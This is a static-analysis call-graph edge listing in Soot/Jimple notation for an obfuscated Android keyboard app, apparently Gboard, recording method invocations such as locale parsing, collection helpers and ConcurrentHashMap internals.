STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i3, $i6) in <ljf: int o(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
SPECIAL edge: specialinvoke r0.<lli: void e(java.lang.Object,java.lang.Object)>($r1, $r2) in <lmb: void g(java.lang.Object,java.lang.Object)> ==> <lli: void e(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r13.<java.lang.String: void <init>(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: void <init>(char[],int,int)>
STATIC edge: staticinvoke <lri: void u(java.lang.Object[])>($r2) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <lri: void u(java.lang.Object[])>
STATIC edge: $r3 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: void D(boolean,java.lang.String,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke $r4.<hnp: void <init>()>() in <hnt: void <clinit>()> ==> <hnp: void <init>()>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ah(int)>
CLINIT edge: staticinvoke <lqr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqr: void <clinit>()>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $l0 = virtualinvoke r0.<j$.sun.misc.b: long k(java.lang.reflect.Field)>($r4) in <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)> ==> <j$.sun.misc.b: long k(java.lang.reflect.Field)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Resetting default value is disallowed [") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r23.<j$.util.concurrent.g: void <init>(j$.util.concurrent.l[])>($r2) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.g: void <init>(j$.util.concurrent.l[])>
STATIC edge: $z0 = staticinvoke <ivw: boolean O(char)>($c3) in <ivw: boolean t(char[],int,int)> ==> <ivw: boolean O(char)>
SPECIAL edge: specialinvoke $r5.<java.util.concurrent.atomic.AtomicLong: void <init>(long)>($l0) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicLong: void <init>(long)>
SPECIAL edge: specialinvoke $r7.<java.lang.String: void <init>(char[])>($r3) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lnc: boolean hasNext()>
VIRTUAL edge: virtualinvoke $r30.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r3) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<llo: lsa F()>() in <lmc: lsa l()> ==> <llo: lsa F()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <ljd: void <init>()> ==> <java.util.AbstractMap: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int size()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lrg: int size()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(46) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
SPECIAL edge: specialinvoke $r1.<llg: void <init>(llo)>(r0) in <llo: lsa F()> ==> <llg: void <init>(llo)>
SPECIAL edge: $i1 = specialinvoke r0.<ivv: int h()>() in <ivv: ivw a()> ==> <ivv: int h()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 260, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ivw: java.lang.String p()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: java.lang.String p()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljf: int c()>() in <ljf: java.util.Set f()> ==> <ljf: int c()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r4, $r5) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.ThreadLocal: void <init>()>() in <oru: void <init>()> ==> <java.lang.ThreadLocal: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: java.lang.Object[] toArray()> ==> <ljf: java.util.Set g()>
SPECIAL edge: specialinvoke $r1.<lqn: void <init>(lkx,java.lang.Object[],int,int)>(r0, $r2, 0, $i0) in <lqq: lma f()> ==> <lqn: void <init>(lkx,java.lang.Object[],int,int)>
CLINIT edge: staticinvoke <ose: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ose: void <clinit>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkh: lkq k()>() in <lqn: lsa l()> ==> <lma: lkq k()>
SPECIAL edge: specialinvoke $r2.<lqs: void <init>(lkq,java.util.Comparator)>($r3, $r0) in <lmo: lqs G(java.util.Comparator)> ==> <lqs: void <init>(lkq,java.util.Comparator)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(1) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
INTERFACE edge: $r2 = interfaceinvoke $r8.<java.util.Iterator: java.lang.Object next()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.d: java.lang.Object next()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: void <init>(char[],int,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()>
SPECIAL edge: specialinvoke $r25.<mag: void <init>(java.lang.String,int,int)>("TENOR_TRENDING_SEARCH_TERM_METADATA", 25, 25) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(10) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r5.<java.util.ConcurrentModificationException: void <init>()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.ConcurrentModificationException: void <init>()>
STATIC edge: $r3 = staticinvoke <lkq: lkq g(java.lang.Object[])>($r2) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <lkq: lkq g(java.lang.Object[])>
STATIC edge: $r0 = staticinvoke <iwt: char[] s(java.lang.String,char,char,int)>($r1, 65, 90, 32) in <iwt: java.lang.String c(java.lang.String)> ==> <iwt: char[] s(java.lang.String,char,char,int)>
STATIC edge: $i0 = staticinvoke <lri: int b(java.util.Set)>(r0) in <lma: int hashCode()> ==> <lri: int b(java.util.Set)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lrg: lsa l()>() in <lrg: java.util.Iterator iterator()> ==> <lrg: lsa l()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(20) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
CLINIT edge: staticinvoke <java.lang.System: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.System: void <clinit>()>
INTERFACE edge: $r1 = interfaceinvoke $r5.<java.util.Map$Entry: java.lang.Object getKey()>() in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
INTERFACE edge: $i0 = interfaceinvoke $r2.<java.util.Comparator: int compare(java.lang.Object,java.lang.Object)>($r3, $r1) in <lmo: int a(java.lang.Object,java.lang.Object)> ==> <lqc: int compare(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: int hashCode()> ==> <ljb: java.lang.Object getValue()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lqs: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqs: int size()>
INTERFACE edge: $r5 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getValue()>() in <hbv: void j()> ==> <lki: java.lang.Object getValue()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r0.<java.lang.Object: boolean equals(java.lang.Object)>($r4) in <lri: boolean a(java.util.Comparator,java.lang.Iterable)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r21.<j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>($r18) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <ljd: void t(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $i1 = virtualinvoke $r7.<java.lang.String: int length()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: int length()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r0.<lso: void <init>()>() in <lsq: void <clinit>()> ==> <lso: void <init>()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(15) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r0) in <lvm: void h(boolean,java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>("ji", "yi") in <ivw: void <clinit>()> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r1.<ljd: java.lang.Object h(int)>($i0) in <ljb: void a()> ==> <ljd: java.lang.Object h(int)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid variant: %s", $r0, $r3) in <ivw: ivw d(java.util.Locale)> ==> <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r0.<java.lang.String: boolean isEmpty()>() in <lsh: lsh j(java.lang.String)> ==> <java.lang.String: boolean isEmpty()>
VIRTUAL edge: $i1 = virtualinvoke $r7.<lsq: int a()>() in <lsc: void f(java.lang.String,ltn)> ==> <lso: int a()>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int max(int,int)>(1, $i6) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.lang.Math: int max(int,int)>
CLINIT edge: staticinvoke <luk: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <luk: void <clinit>()>
STATIC edge: $l1 = staticinvoke <java.lang.System: long nanoTime()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.lang.System: long nanoTime()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lkg: void <init>(int)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r12 = virtualinvoke $r6.<lkt: lkx l()>() in <lmb: lme f()> ==> <lkt: lkx l()>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke r0.<lsv: void <init>()>() in <lsg: void <init>()> ==> <lsv: void <init>()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, 0, 1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
SPECIAL edge: specialinvoke $r1.<lvs: void <init>(java.lang.String,int)>("STRING", 1) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
VIRTUAL edge: $i0 = virtualinvoke $r5.<java.lang.String: int length()>() in <ivw: java.lang.String p()> ==> <java.lang.String: int length()>
VIRTUAL edge: $z0 = virtualinvoke r0.<nzh: boolean e()>() in <nzh: boolean f(ivv)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r3.<lvq: void <init>(lvr,int)>(r0, $i0) in <lvr: java.util.Map$Entry d(java.lang.String,int)> ==> <lvq: void <init>(lvr,int)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean m()>() in <ljf: int b()> ==> <ljf: boolean m()>
STATIC edge: $r0 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r0, $i1) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r15.<lvr: void <init>(lvr,lvr)>($r16, $r17) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lvr: void <init>(lvr,lvr)>
SPECIAL edge: $r1 = specialinvoke r0.<ljf: int[] r()>() in <ljf: void l(int)> ==> <ljf: int[] r()>
SPECIAL edge: specialinvoke $r3.<java.util.concurrent.atomic.AtomicInteger: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicInteger: void <init>()>
STATIC edge: $i4 = staticinvoke <izw: int ag(int,int,int)>($i2, $i1, $i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ag(int,int,int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean A(char)>($c3) in <nzh: boolean f(ivv)> ==> <ivw: boolean A(char)>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "fromLocale", 222, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
SPECIAL edge: specialinvoke $r30.<hfd: void <init>(hff,java.lang.Class,ldp)>($r18, class "Ljava/nio/ByteBuffer;", $r19) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hfd: void <init>(hff,java.lang.Class,ldp)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <j$.util.concurrent.ConcurrentHashMap: int hashCode()>
STATIC edge: $r6 = staticinvoke <lqq: lqq a(int,java.lang.Object[])>(4, $r9) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <lqq: lqq a(int,java.lang.Object[])>
VIRTUAL edge: $r0 = virtualinvoke $r0.<java.lang.String: java.lang.String concat(java.lang.String)>(" must not be null") in <lvm: java.lang.Object g(java.lang.Object,java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(10) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: virtualinvoke r0.<lkh: int b(java.lang.Object[],int)>($r1, 0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int b(java.lang.Object[],int)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r1, $i0) in <ljd: void t(int)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
SPECIAL edge: specialinvoke $r6.<ltc: void <init>(java.lang.String,int,int)>("NONE", 4, 0) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
STATIC edge: $r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r4) in <ivw: java.lang.String p()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.lang.UnsupportedOperationException: void <init>()>() in <lkh: int c()> ==> <java.lang.UnsupportedOperationException: void <init>()>
SPECIAL edge: $z0 = specialinvoke r0.<lsn: boolean ac()>() in <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)> ==> <lsn: boolean ac()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>($r3, $l3, $l4, $l5) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Language tag type is set to ") in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(boolean[],boolean[])>($r18, $r19) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(boolean[],boolean[])>
VIRTUAL edge: $i0 = virtualinvoke $r3.<j$.sun.misc.b: int b(java.lang.Class)>(class "[Lj$/util/concurrent/l;") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: int b(java.lang.Class)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lje: boolean hasNext()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r5, $i6, $i1) in <ljf: boolean add(java.lang.Object)> ==> <izw: void an(java.lang.Object,int,int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljf: java.lang.Object[] s()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <java.util.HashSet: int size()>
SPECIAL edge: specialinvoke $r2.<java.lang.UnsupportedOperationException: void <init>()>() in <lkh: boolean add(java.lang.Object)> ==> <java.lang.UnsupportedOperationException: void <init>()>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <ljf: void q(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
SPECIAL edge: specialinvoke $r23.<mag: void <init>(java.lang.String,int,int)>("PLAYSTORE_STICKER_IMAGE", 23, 23) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.LinkageError: void <init>()>() in <java.lang.ExceptionInInitializerError: void <init>(java.lang.String)> ==> <java.lang.LinkageError: void <init>()>
SPECIAL edge: specialinvoke r0.<lka: void <init>()>() in <mii: void <init>()> ==> <lka: void <init>()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lfc: void <init>(lfa)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r2) in <ivv: ivw a()> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r11.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_METADATA", 11, 11) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<ljd: int size()>() in <ljb: void a()> ==> <ljd: int size()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>("iw", "he") in <ivw: void <clinit>()> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <ljf: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r4.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lta: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lwa: void <init>()>() in <lwa: void <clinit>()> ==> <lwa: void <init>()>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.Collection: java.lang.Object[] toArray()>() in <lma: lma p(java.util.Collection)> ==> <ljf: java.lang.Object[] toArray()>
SPECIAL edge: specialinvoke $r0.<lql: void <init>(java.lang.Object[],int)>($r1, 0) in <lql: void <clinit>()> ==> <lql: void <init>(java.lang.Object[],int)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>("in", "id") in <ivw: void <clinit>()> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.util.LinkedHashMap: void <init>(int,float)>($i0, 1.0F) in <ljd: java.util.Map n(int)> ==> <java.util.LinkedHashMap: void <init>(int,float)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lsp: void <init>(java.lang.String,java.lang.String,int,java.lang.String)>($r0, $r1, $i0, $r2) in <lsq: lsq e(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsp: void <init>(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $l3 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: long l()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: long l()>
VIRTUAL edge: $z2 = virtualinvoke $r9.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l6, $i2, $i7) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
CLINIT edge: staticinvoke <mag: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <mag: void <clinit>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: int hashCode()>
STATIC edge: $r3 = staticinvoke <iwt: java.lang.String c(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <iwt: java.lang.String c(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.UnsupportedOperationException: void <init>()>() in <lkh: int j()> ==> <java.lang.UnsupportedOperationException: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r0.<java.util.List: boolean isEmpty()>() in <ivw: java.lang.String[] Q(java.util.List)> ==> <java.util.ArrayList: boolean isEmpty()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c2) in <ivw: boolean v(java.lang.String)> ==> <ivw: boolean u(char)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Collection: boolean isEmpty()>() in <lmb: lme f()> ==> <ljf: boolean isEmpty()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(0) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r2.<java.util.ConcurrentModificationException: void <init>()>() in <liz: void b()> ==> <java.util.ConcurrentModificationException: void <init>()>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)>($r3, $i2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r0.<java.lang.String: boolean isEmpty()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: boolean isEmpty()>
SPECIAL edge: specialinvoke $r3.<java.lang.AssertionError: void <init>(java.lang.Object)>($r1) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(10) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lmc: lsa l()>
SPECIAL edge: specialinvoke $r2.<lfc: void <init>(lfa)>($r0) in <iye: lfa p(lfa)> ==> <lfc: void <init>(lfa)>
VIRTUAL edge: virtualinvoke r0.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lly: void j(java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: staticinvoke <lsc: void f(java.lang.String,ltn)>("unbounded recursion in log statement", r0) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsc: void f(java.lang.String,ltn)>
VIRTUAL edge: $i0 = virtualinvoke $r3.<j$.sun.misc.b: int a(java.lang.Class)>(class "[Lj$/util/concurrent/l;") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: int a(java.lang.Class)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r4.<qj: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r6) in <ivv: ivw i(java.lang.String)> ==> <qj: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lkt: void e(int)>($i0) in <lkt: void a(java.lang.Object,java.lang.Object)> ==> <lkt: void e(int)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i2, $r12) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
STATIC edge: $r7 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i0, $r6) in <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])> ==> <lma: lma i(int,java.lang.Object[])>
SPECIAL edge: specialinvoke $r4.<j$.util.concurrent.v: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.v: void <init>()>
